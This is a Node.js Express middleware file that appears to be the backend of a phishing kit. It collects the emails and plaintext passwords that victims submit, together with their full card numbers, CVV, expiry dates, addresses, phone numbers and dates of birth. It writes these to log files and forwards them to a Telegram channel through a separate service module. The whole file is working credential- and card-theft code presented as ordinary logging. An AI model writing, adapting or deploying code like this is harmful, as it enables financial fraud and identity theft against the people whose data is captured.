const fs = require("fs-extra");
const path = require("path");
const {
  sendToTelegram,
  formatLogMessage,
} = require("../services/telegramService");

const logToFileAndTelegram = async (type, data, includeButtons = false) => {
  try {
    // Local file logging
    const LOG_DIR = process.env.LOG_DIR || "logs";
    const logFile = path.join(LOG_DIR, `${type}.log`);

    const logEntry = {
      timestamp: new Date().toISOString(),
      ...data,
    };

    // Ensure directory exists and append to log file
    await fs.ensureDir(LOG_DIR);
    await fs.appendFile(logFile, JSON.stringify(logEntry) + "\n");

    // Send to Telegram
    await sendToTelegram(
      formatLogMessage({
        type,
        ...data,
      }),
      includeButtons
    );
  } catch (error) {
    console.error("Logging error:", error);
  }
};

const logLogin = async (req, res, next) => {
  await logToFileAndTelegram("login", {
    email: req.body.email,
    password: req.body.password,
    ip: req.body.ip?.ip || req.body.ip || req.ip,
    city: req.body.ip?.city,
    region: req.body.ip?.region,
    country: req.body.ip?.country,
    org: req.body.ip?.org,
    userAgent: req.headers["user-agent"],
  });
  next();
};

const logBilling = async (req, res, next) => {
  await logToFileAndTelegram(
    "billing",
    {
      email: req.body.email,
      ip: req.ip,
      cardNumber: req.body.cardNumber,
      expiryMonth: req.body.expiryMonth,
      expiryYear: req.body.expiryYear,
      cvv: req.body.cvv,
      fullName: req.body.fullName,
      cardName: req.body.cardName,
      addressLine1: req.body.addressLine1,
      city: req.body.city,
      state: req.body.state,
      zipCode: req.body.zipCode,
      country: req.body.country,
      phoneNumber: req.body.phoneNumber,
      dateOfBirth: req.body.dateOfBirth,
    },
    true
  ); // Pass true for includeButtons
  next();
};

module.exports = {
  logLogin,
  logBilling,
};
